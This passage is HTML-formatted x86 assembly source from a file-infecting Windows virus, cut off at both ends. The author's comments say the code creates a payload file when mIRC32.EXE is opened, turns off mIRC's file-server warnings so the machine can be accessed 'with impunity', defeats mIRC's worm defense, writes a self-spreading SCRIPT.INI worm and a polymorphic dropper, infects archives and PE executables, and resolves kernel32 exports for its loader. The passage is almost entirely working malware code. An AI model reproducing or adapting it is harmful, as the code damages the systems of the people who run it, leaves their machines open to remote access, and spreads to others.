         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">           </span><span class="sc1">;kill attributes</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'23CR'</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NomIRC</span><span class="sc0">                            </span><span class="sc1">;we're opening MIRC32.EXE??</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'IM'</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NomIRC</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NomIRC</span><span class="sc0">
  </span><span class="sc5">DropWorm</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pushad</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_OPENCREAT_IN_CONTEXT</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01b</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">Killer</span><span class="sc0">              </span><span class="sc1">;create our payload file</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ErrorWorm</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">KCode</span><span class="sc0">               </span><span class="sc1">;write payload code to it</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">KCodeSize</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">           </span><span class="sc1">;close it</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_OPENCREAT_IN_CONTEXT</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">MircIni</span><span class="sc0">             </span><span class="sc1">;open MIRC.INI</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ErrorWorm</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ErrorWorm</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">IMircIni</span><span class="sc0">            </span><span class="sc1">;set /FSERVER warnings off, so</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InsertSize</span><span class="sc0">                   </span><span class="sc1">;we can access this machine</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">           </span><span class="sc1">;with impunity ;)</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ErrorWorm</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_OPENCREAT_IN_CONTEXT</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01b</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ScriptName2</span><span class="sc0">         </span><span class="sc1">;create SCRIPT.NOT, to avoid</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">           </span><span class="sc1">;build-in worm defense in</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ErrorWorm</span><span class="sc0">                          </span><span class="sc1">;mIRC</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_OPENCREAT_IN_CONTEXT</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01b</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">                          </span><span class="sc1">;create SCRIPT.INI</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ScriptName</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ErrorWorm</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ScriptIni</span><span class="sc0">           </span><span class="sc1">;write our inet spreading worm</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ScriptSize</span><span class="sc0">                   </span><span class="sc1">;and get ready to travel! :)</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_OPENCREAT_IN_CONTEXT</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01b</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">IncaName</span><span class="sc0">            </span><span class="sc1">;create virus dropper for inet</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">           </span><span class="sc1">;spreading</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ErrorWorm</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileBuffer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">           </span><span class="sc1">;write dropper code</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">           </span><span class="sc1">;close it</span><span class="sc0">
  </span><span class="sc5">ErrorWorm</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">popad</span><span class="sc0">
  </span><span class="sc5">NomIRC</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;get extension(with little</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'AHL.'</span><span class="sc0">                   </span><span class="sc1">;encription to avoid lamerz)</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">LHAInfect</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'HZL.'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">LHAInfect</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'KAP.'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">LHAInfect</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'PIZ.'</span><span class="sc0">                   </span><span class="sc1">;if archivers, go drop virus</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">InfectZIP</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'JRA.'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">InfectARJ</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'RAR.'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">InfectRAR</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'RCS.'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">InfectExecutableFile</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">                   </span><span class="sc1">;if EXE or SCR, check for PE</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitUnmark</span><span class="sc0">

  </span><span class="sc5">InfectExecutableFile</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">           </span><span class="sc1">;open probable host</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitUnmark</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitClose</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MINSIZEINFECT</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ExitClose</span><span class="sc0">                          </span><span class="sc1">;if too small, exit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_READFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">CrcTab</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitClose</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">NEPECheck</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'MZ'</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitClose</span><span class="sc0">                         </span><span class="sc1">;must be a EXE file</span><span class="sc0">

  </span><span class="sc5">NEPECheck</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitClose</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;probable PE sign in range?</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">ExitClose</span><span class="sc0">

  </span><span class="sc5">InfectPE</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
         </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">ExitClose</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">             </span><span class="sc1">;must be a PE file</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitClose</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">           </span><span class="sc1">;ready to infect, close file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VxDMapFile</span><span class="sc0">                       </span><span class="sc1">;map file in memory</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitUnmark</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectPEFile</span><span class="sc0">                     </span><span class="sc1">;infect it!</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VxDUnMapFile</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitUnmark</span><span class="sc0">                        </span><span class="sc1">;unmap file</span><span class="sc0">

                                               </span><span class="sc1">;this code goes inserted in</span><span class="sc0">
                                               </span><span class="sc1">;PE filez, after the poly</span><span class="sc0">
  </span><span class="sc5">PELoader</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;decription routine</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_SEH</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ReturnHost</span><span class="sc0">                        </span><span class="sc1">;if a fault happen, jump host</span><span class="sc0">
  </span><span class="sc5">set_SEH</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                          </span><span class="sc1">;setup a SEH for us</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PEDelta</span><span class="sc0">
  </span><span class="sc5">PEDelta</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PEDelta</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AnaliseKernel32</span><span class="sc0">                  </span><span class="sc1">;get GetModuleHandleA and</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnHost</span><span class="sc0">                         </span><span class="sc1">;GetProcAddressA from kernel32</span><span class="sc0">
                                               </span><span class="sc1">;export table</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">NamePtr</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc4">)]</span><span class="sc0">
